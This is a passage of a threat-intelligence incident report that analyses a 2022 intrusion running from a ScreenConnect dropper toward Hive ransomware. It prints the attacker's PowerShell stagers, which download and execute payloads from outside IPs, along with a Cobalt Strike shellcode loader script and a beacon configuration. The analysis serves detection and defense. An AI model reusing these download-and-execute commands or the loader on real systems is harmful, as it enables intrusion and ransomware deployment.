<li class="menu-item menu-item-type-custom menu-item-object-custom menu-item-31033"><a href="https://store.thedfirreport.com/collections/dfir-labs">Access DFIR Labs</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21312"><a href="https://thedfirreport.com/merchandise/">Merchandise</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-21520" class="post-21520 post type-post status-publish format-standard hentry category-cobaltstrike category-hive category-ransomware category-wmiexec entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-122" href="https://thedfirreport.com/category/hive/">Hive</a>
<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
<a class="category-color-105" href="https://thedfirreport.com/category/wmiexec/">wmiexec</a>
</span>
</div>
<h1 class="entry-title">From ScreenConnect to Hive Ransomware in 61 hours</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2023/09/25/from-screenconnect-to-hive-ransomware-in-61-hours/" rel="bookmark"><time class="entry-date published" datetime="2023-09-25T00:58:24+00:00">September 25, 2023</time></a></span> </div>
</header>
<div class="entry-content">
<p>In 2022, <a href="https://thedfirreport.com/2023/03/06/2022-year-in-review/" target="_blank" rel="noreferrer noopener">The DFIR Report observed an increase</a> in the adversarial usage of Remote Management and Monitoring (RMM) tools. When compared to post-exploitation channels that heavily rely on terminals, such as Cobalt Strike or Metasploit, the graphical user interface provided by RMMs are more user friendly. With the popularity of SaaS (Software as a Service) models, many RMMs are further offered as cloud-based services. By having command &amp; control channels rely on legitimate cloud services, adversaries make attribution and disruption more complex. Utilizing RMMs could also hinder detection (i.e. trusted domains &amp; signed executables).</p>
<p>The 2022 increase in RMM usage has been observed industry-wide and even warranted CISA&#8217;s &#8220;<a href="https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-025a" target="_blank" rel="noreferrer noopener">Protecting Against Malicious Use of Remote Monitoring and Management Software</a>&#8221; advisory.</p>
<p>This multi-RMM intrusion, dated Q4 2022, acts as a complement to previous observations and ultimately lead to the deployment of the <a href="https://www.justice.gov/opa/pr/us-department-justice-disrupts-hive-ransomware-variant" target="_blank" rel="noreferrer noopener">now-disrupted</a> Hive ransomware.</p>
<h2 id="services" class="wp-block-heading"><a href="https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#services">Services</a></h2>
<ul>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-brief" target="_blank" rel="noopener">Private Threat Briefs</a>:</strong> Over 25 private reports annually, such as this one but more concise and quickly published post-intrusion.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#threat-feed" target="_blank" rel="noopener">Threat Feed</a>:</strong> Focuses on tracking Command and Control frameworks like Cobalt Strike, Metasploit, Sliver, etc.</li>
<li><strong><a href="https://thedfirreport.com/services/threat-intelligence/#all-intel" target="_blank" rel="noopener">All Intel</a>:</strong> Includes everything from Private Threat Briefs and Threat Feed, plus private events, long-term tracking, data clustering, and other curated intel.</li>
<li><strong><a href="https://thedfirreport.com/services/detection-rules/" target="_blank" rel="noopener">Private Sigma Ruleset</a>:</strong> Features 100+ Sigma rules derived from 40+ cases, mapped to ATT&amp;CK with test examples.</li>
<li><strong><a href="https://thedfirreport.com/services/dfir-labs/" target="_blank" rel="noreferrer noopener">DFIR Labs</a>:</strong> Offers cloud-based, hands-on learning experiences using real data from real intrusions. Interactive labs are available with different difficulty levels and can be accessed on-demand, accommodating various learning speeds.</li>
</ul>
<p>Contact us today for a demo!</p>
<h2 id="case-summary" class="wp-block-heading"><a href="#case-summary">Case Summary</a></h2>
<p>In this intrusion from October 2022, we observed a threat actor relying on a RMM tool as the initial access, and ended with a somewhat botched Hive ransomware deployment. The initial payload was an executable file masquerading as a legitimate document. <a href="#initial-access">According to Huntress</a>, this campaign was likely delivered via an email, with a link, causing the executable&#8217;s download when clicked on.</p>
<p>The execution of the file resulted in the installation of <a href="https://screenconnect.connectwise.com/" target="_blank" rel="noreferrer noopener">ScreenConnect</a>. During the investigation, we observed that this initial access method required the end user to be a local Administrator, as less privileged users would cause the installation to fail. Around an hour after execution, the threat actor initiated discovery commands via ScreenConnect using standard Windows utilities like <i>systeminfo</i>, <i>ipconfig</i>, and <i>net</i>. A few minutes later, the threat actor proceeded to run a BITS transfer job to deploy a Cobalt Strike beacon.</p>
<p>After an hour of paused activity, the threat actor used ScreenConnect to download an additional binary. This new file was a trojanized ApacheBench executable which was back-doored with Metasploit shellcode. When executed, the shellcode would initiate a Meterpreter command and control channel. After starting this new command and control channel, the threat actor moved on to lateral movement using remote services to execute PowerShell and MSI installers for Atera and Splashtop on a server. Additional BITS transfers were observed to establish further Cobalt Strike footholds.</p>
<p>Around 20 minutes after this activity, the threat actor continued lateral movement towards other hosts using Impacket&#8217;s <a href="https://github.com/fortra/impacket/blob/master/examples/wmiexec.py" target="_blank" rel="noreferrer noopener">wmiexec.py</a> script. This lateral movement included a check on the remote hosts using <i>quser</i>, and starting BITS transfers to execute Cobalt Strike.</p>
<p>On the following day, the threat actor dropped a Mimikatz binary on several servers and executed them remotely using wmiexec. Activity stopped for another few hours, until the threat actor returned to run a new Cobalt Strike beacon on several hosts across the environment. From these beacons, a few discovery commands were issued, after which the threat actor went dormant again.</p>
<p>The next day, the threat actor executed a batch file used to extract Active Directory data using built-in PowerShell utilities. Activity then ceased until late in the day when the threat actor returned and began accessing hosts via RDP. From these RDP sessions, the threat actor reviewed file shares and backups within the network. The threat actor then dropped Rclone on a server with file shares and proceeded to configure a connection to a remote server over <a href="https://rclone.org/sftp/">SFTP</a>. Once connected, the threat actor moved to exfiltrate the file share&#8217;s contents over the SFTP connection. While the exfiltration was running, the threat actor dropped <a href="https://www.softperfect.com/products/networkscanner/" target="_blank" rel="noreferrer noopener">netscan</a> on the server and conducted scans of the network with a particular focus on RDP services.</p>
<p>Around three hours after exfiltration started, the threat actor began their final action by deploying the Hive ransomware. To start, they changed an administrator&#8217;s password and then manually executed the ransomware on several key servers. After these manual ransomware executions, the threat actor moved to attempt domain-wide encryption. To do so, the threat actor staged the ransomware binary on a network share and then created a new domain-wide GPO with a scheduled task intended to run the ransomware binary on each domain-joined host.</p>
<p>The GPO and scheduled task creation included incorrect settings, resulting in a failed domain-wide ransomware deployment.  However, via manual ransomware deployment and execution, key servers were successfully encrypted. From initial access, the time to ransomware (TTR) was 61 hours.</p>
<h2 class="wp-block-heading">Analysts</h2>
<p>Analysis and reporting completed by <a href="https://twitter.com/0xThiebaut">0xThiebaut</a>, UC2, and <a href="https://twitter.com/0xtornado">0xtornado</a>.</p>
<h2 id="initial-access" class="wp-block-heading"><a href="#initial-access">Initial Access</a></h2>
<p>The intrusion started with the execution of a  executable named <i>document8765.exe</i>. According to <a href="https://www.huntress.com/" target="_blank" rel="noreferrer noopener">Huntress</a>, this initial access file was delivered to end users after browsing to <i>https[:]//environmentca[.]com/bkh6q</i>. In Huntress&#8217;s data, the site was loaded from an Outlook process indicating likely email delivery.</p>
<h2 id="execution" class="wp-block-heading"><a href="#execution">Execution</a></h2>
<hr/>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-001.png"><img fetchpriority="high" decoding="async" class="aligncenter size-full wp-image-21545" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-001.png" alt width="1097" height="616" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-001.png 1097w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-001-300x168.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-001-1024x575.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-001-768x431.png 768w" sizes="(max-width: 1097px) 100vw, 1097px" /></a></p>
<hr/>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-002.png"><img decoding="async" class="aligncenter size-full wp-image-21546" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-002.png" alt width="1113" height="671" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-002.png 1113w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-002-300x181.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-002-1024x617.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-002-768x463.png 768w" sizes="(max-width: 1113px) 100vw, 1113px" /></a></p>
<p>&nbsp;</p>
<h3 class="wp-block-heading"> </h3>
<h3 class="wp-block-heading">ScreenConnect</h3>
<p>There are many techniques to detect the execution of user-downloaded executables. While some effective techniques rely on the presence of a MOTW (Mark of the Web), simply reviewing programs started from within the user&#8217;s <i>%USERPROFILE%\Downloads</i> folder is a common and effective technique. The execution of such downloads can be observed through both the default security event <i>4688</i> (<a href="https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4688" target="_blank" rel="noreferrer noopener">A new process has been created</a>) as well as Sysmon&#8217;s event <i>1</i> (<a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-1-process-creation" target="_blank" rel="noreferrer noopener">Process creation</a>).</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-003.png"><img decoding="async" class="aligncenter size-full wp-image-21547" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-003.png" alt width="1116" height="59" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-003.png 1116w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-003-300x16.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-003-1024x54.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-003-768x41.png 768w" sizes="(max-width: 1116px) 100vw, 1116px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-004.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21548" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-004.png" alt width="1326" height="57" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-004.png 1326w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-004-300x13.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-004-1024x44.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-004-768x33.png 768w" sizes="(max-width: 1326px) 100vw, 1326px" /></a></p>
<p>Once executed, the malicious dropper staged a Windows Installer File (<i>*.msi</i>) within the user&#8217;s <i>%TEMP%</i> directory and proceeded with the execution of the installer through <i>msiexec.exe</i>, as seen in the following Sysmon event <i>1</i>. Once this installer executed, the malicious <i>document8765.exe</i> process terminated.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-005.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21549" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-005.png" alt width="1751" height="57" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-005.png 1751w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-005-300x10.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-005-1024x33.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-005-768x25.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-005-1536x50.png 1536w" sizes="(max-width: 1751px) 100vw, 1751px" /></a></p>
<p>The absence of the <i>/q </i><a href="https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/msiexec#display-options" target="_blank" rel="noreferrer noopener">display options</a> results in the installer being user-visible. This can be observed in sandbox executions such as in the &#8220;Replay Monitor&#8221; from <a href="https://tria.ge/221019-wfsjpsaed5/behavioral2#monitor-header" target="_blank" rel="noreferrer noopener">Recorded Future&#8217;s Triage</a> Sandbox.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-006.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21550" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-006.png" alt width="1280" height="720" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-006.png 1280w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-006-300x169.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-006-1024x576.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-006-768x432.png 768w" sizes="(max-width: 1280px) 100vw, 1280px" /></a></p>
<p>Upon execution, the malicious installer deploys a legitimate instance of the <a href="https://screenconnect.connectwise.com/" target="_blank" rel="noreferrer noopener">ScreenConnect</a> RMM software. As part of this installation process, additional <i>msiexec.exe</i> and <i>rundll32.exe</i> invocations took place, details of which are omitted due to being part of the legitimate ScreenConnect installer. Most notably, ScreenConnect was installed within the <i>%ProgramFiles(x86)%\ScreenConnect Client (0e2f8d025e383f56)\</i> subdirectory, where <i>0e2f8d025e383f56</i> is an installation thumbprint.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-007.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21551" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-007.png" alt width="1161" height="73" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-007.png 1161w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-007-300x19.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-007-1024x64.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-007-768x48.png 768w" sizes="(max-width: 1161px) 100vw, 1161px" /></a></p>
<p>ScreenConnect persistence as well as related command &amp; control mechanisms are discussed in later sections.</p>
<p>Once the ScreenConnect channel was established, the threat actor was able to execute additional commands through the RMM utility&#8217;s built-in features. For ScreenConnect, command execution is performed by dropping the desired script on disc, followed by its execution through the appropriate interpreter (Command Prompt or PowerShell). This mechanism provides numerous detection opportunities through Sysmon&#8217;s event <i>11 (file create);</i> as well as, upon execution, the Security event <i>4688</i> or Sysmon event <i>1</i>, displayed hereafter.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-008.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21552" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-008.png" alt width="1870" height="282" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-008.png 1870w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-008-300x45.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-008-1024x154.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-008-768x116.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-008-1536x232.png 1536w" sizes="(max-width: 1870px) 100vw, 1870px" /></a></p>
<p>As part of these executed commands, multiple discovery actions were carried out; these are further documented within the discovery section. Additionally, the threat actor was seen attempting to execute additional PowerShell scripts.</p>
<h4 class="wp-block-heading">Cobalt Strike</h4>
<p>One of the commands issued through ScreenConnect was the deployment of Cobalt Strike through a PowerShell stager, one hour 22 minutes into the intrusion.</p>
<pre>powershell.exe -nop -c "start-job { param($a) Import-Module BitsTransfer; $d = $env:temp + '\' + [System.IO.Path]::GetRandomFileName(); Start-BitsTransfer -Source 'http://31.41.244.192:80/96945jgjf' -Destination $d; $t = [IO.File]::ReadAllText($d); Remove-Item $d; IEX $t } -Argument 0 | wait-job | Receive-Job" </pre>
<p>By relying on plain HTTP, the retrieved PowerShell payload can be extracted from the network communications.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-009.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21553" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-009.png" alt width="1423" height="740" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-009.png 1423w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-009-300x156.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-009-1024x533.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-009-768x399.png 768w" sizes="(max-width: 1423px) 100vw, 1423px" /></a></p>
<p>Similar to the above Cobalt Strike stager, a second attempt was made using the following command.</p>
<pre>powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://31.41.244.192:80/645gkdkfgd'))"</pre>
<p>Here again, by relying on plain HTTP, the actor exposed the PowerShell payload.</p>
<pre>Set-StrictMode -Version 2

$DoIt = @'
function func_get_proc {
	Param (
		$var_module_name, $var_procedure_name
	)
	
	$var_system_dll = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Location -And $_.Location.Split('\\')[-1].Equals('System.dll') -And $_.GlobalAssemblyCache }
	$var_microsoft_win32_unsafe_native_methods = $var_system_dll.GetType('Microsoft.Win32.UnsafeNativeMethods')
	$var_get_module_handle = $var_microsoft_win32_unsafe_native_methods.GetMethod('GetModuleHandle')
	$var_get_proc_address = $var_microsoft_win32_unsafe_native_methods.GetMethod('GetProcAddress', [Type[]] @('System.Runtime.InteropServices.HandleRef', 'System.String'))
	$var_module_handle = $var_get_module_handle.Invoke($null, @($var_module_name))
	return $var_get_proc_address.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), $var_module_handle)), $var_procedure_name))
}

function func_get_type {
	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $var_parameter_types,
		[Parameter(Position = 1)] [Type] $var_return_type = [Void]
	)

	$var_invoke_method = 'Invoke'
	$var_type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflectss, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	$var_type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $var_parameter_types).SetImplementationFlags('Runtime, Managed')
	$var_type.DefineMethod($var_invoke_method, 'Public, HideBySig, NewSlot, Virtual', $var_return_type, $var_parameter_types).SetImplementationFlags('Runtime, Managed')
	return $var_type.CreateType()
}

$var_base64 = 'i0QkBIuInAAAA[...]AAAAAAA='

$var_result = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc kernel32.dll LoadLibraryA), (func_get_type @([String]) ([IntPtr]))).Invoke('crypt32.dll')
$var_string_to_binary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc crypt32.dll CryptStringToBinaryA), (func_get_type @([String], [UInt32], [UInt32], [IntPtr], [UInt32].MakeByRefType(), [IntPtr], [IntPtr]) ([Bool])))

$var_length = 0
$var_result = $var_string_to_binary.Invoke($var_base64, $var_base64.Length, 0x1, [IntPtr]::Zero, [Ref]$var_length, [IntPtr]::Zero, [IntPtr]::Zero)

$var_create_mapping = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc kernel32.dll CreateFileMappingA), (func_get_type @([IntPtr], [IntPtr], [UInt32], [UInt32], [UInt32], [IntPtr]) ([IntPtr])))
$var_handle = $var_create_mapping.Invoke(-1, [IntPtr]::Zero, 0x08000040, 0x0, $var_length, [IntPtr]::Zero)

$var_map_view = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc kernel32.dll MapViewOfFile), (func_get_type @([IntPtr], [UInt32], [UInt32], [UInt32], [IntPtr]) ([IntPtr])))
$var_map = $var_map_view.Invoke($var_handle, 0x000F003F, 0, 0, $var_length)

$var_result = $var_string_to_binary.Invoke($var_base64, $var_base64.Length, 0x1, $var_map, [Ref]$var_length, [IntPtr]::Zero, [IntPtr]::Zero)

$var_invoke = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_map, (func_get_type @([IntPtr]) ([Void])))
$var_invoke.Invoke($var_map)

'@

Switch ([intptr]::Size) {
	4 {
		IEX $DoIt
	}
	8 {
		start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
	}
}
</pre>
<p>As Cobalt Strike beacons load themselves into memory, we can extract the associated configuration using tools such as <a href="https://github.com/strozfriedberg/cobaltstrike-config-extractor" target="_blank" rel="noreferrer noopener">cobaltstrike-config-extractor</a>.</p>
<pre>{
  "beacontype": [
    "HTTP"
  ],
  "sleeptime": 60000,
  "jitter": 0,
  "maxgetsize": 1048576,
  "spawnto": "AAAAAAAAAAAAAAAAAAAAAA==",
  "license_id": 1580103824,
  "cfg_caution": false,
  "kill_date": null,
  "server": {
    "hostname": "31.41.244.192",
    "port": 80,
    "publickey": "MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnCZHWnYFqYB/6gJdkc4MPDTtBJ20nkEAd3tsY4tPKs8MV4yIjJb5CtlrbKHjzP1oD/1AQsj6EKlEMFIKtakLx5+VybrMYE+dDdkDteHmVX0AeFyw001FyQVlt1B+OSNPRscKI5sh1L/ZdwnrMy6S6nNbQ5N5hls6k2kgNO5nQ7QIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=="
  },
  "host_header": "",
  "useragent_header": null,
  "http-get": {
    "uri": "/fwlink",
    "verb": "GET",
    "client": {
      "headers": null,
      "metadata": null
    },
    "server": {
      "output": [
        "print"
      ]
    }
  },
  "http-post": {
    "uri": "/submit.php",
    "verb": "POST",
    "client": {
      "headers": null,
      "id": null,
      "output": null
    }
  },
  "tcp_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "crypto_scheme": 0,
  "proxy": {
    "type": null,
    "username": null,
    "password": null,
    "behavior": "Use IE settings"
  },
  "http_post_chunk": 0,
  "uses_cookies": true,
  "post-ex": {
    "spawnto_x86": "%windir%\\syswow64\\rundll32.exe",
    "spawnto_x64": "%windir%\\sysnative\\rundll32.exe"
  },
  "process-inject": {
    "allocator": null,
    "execute": [
      "CreateThread",
      "SetThreadContext",
      "CreateRemoteThread",
      "RtlCreateUserThread"
    ],
    "min_alloc": 0,
    "startrwx": true,
    "stub": "IiuPJ9vfuo3dVZ7son6mSA==",
    "transform-x86": null,
    "transform-x64": null,
    "userwx": true
  },
  "dns-beacon": {
    "dns_idle": null,
    "dns_sleep": null,
    "maxdns": null,
    "beacon": null,
    "get_A": null,
    "get_AAAA": null,
    "get_TXT": null,
    "put_metadata": null,
    "put_output": null
  },
  "pipename": null,
  "smb_frame_header": "AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=",
  "stage": {
    "cleanup": false
  },
  "ssh": {
    "hostname": null,
    "port": null,
    "username": null,
    "password": null,
    "privatekey": null
  }
}
</pre>
<h4 class="wp-block-heading">Powerfun</h4>
<p>About 40 minutes later, two hours and seven minutes into the intrusion, the threat actor leveraged another stager based on <i>System.Net.WebClient</i>&#8216;s <i>DownloadFile</i> function to drop <i>%temp%\P6nqEdwk.exe</i>. This trojanized executable was downloaded from <i>http://94.232.43[.]201:8080/dQhNZOV3Qm</i> and subsequently executed.</p>
<pre>powershell.exe -nop -w hidden -c [Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;$z="echo ($env:temp+'\P6nqEdwk.exe')"; (new-object System.Net.WebClient).DownloadFile('http://94.232.43.201:8080/dQhNZOV3Qm', $z); invoke-item $z</pre>
<p>Sysmon&#8217;s process creation event <i>1</i> (or alternatively the Security event <i>4688</i>) captured the parent-child relationship as shown below.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-010.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21554" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-010.png" alt width="3376" height="265" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-010.png 3376w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-010-300x24.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-010-1024x80.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-010-768x60.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-010-1536x121.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-010-2048x161.png 2048w" sizes="(max-width: 3376px) 100vw, 3376px" /></a></p>
<p>Upon inspection, the trojanized executable seems based on ApacheBench 2.3, a legitimate HTTP benchmarking utility.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-011.png"><img loading="lazy" decoding="async" class="aligncenter wp-image-21555 size-full" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-011.png" alt width="802" height="1087" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-011.png 802w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-011-221x300.png 221w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-011-756x1024.png 756w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-011-768x1041.png 768w" sizes="(max-width: 802px) 100vw, 802px" /></a></p>
<p>The ApacheBench executable has, however, been modified to embed an additional PowerShell payload.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-012.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21556" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-012.png" alt width="1399" height="916" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-012.png 1399w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-012-300x196.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-012-1024x670.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-012-768x503.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-012-765x500.png 765w" sizes="(max-width: 1399px) 100vw, 1399px" /></a></p>
<p>Upon execution of the ApacheBench executable, the PowerShell payload gets executed.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2023/09/18364-013.png"><img loading="lazy" decoding="async" class="aligncenter size-full wp-image-21557" src="https://thedfirreport.com/wp-content/uploads/2023/09/18364-013.png" alt width="3448" height="203" srcset="https://thedfirreport.com/wp-content/uploads/2023/09/18364-013.png 3448w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-013-300x18.png 300w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-013-1024x60.png 1024w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-013-768x45.png 768w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-013-1536x90.png 1536w, https://thedfirreport.com/wp-content/uploads/2023/09/18364-013-2048x121.png 2048w" sizes="(max-width: 3448px) 100vw, 3448px" /></a></p>
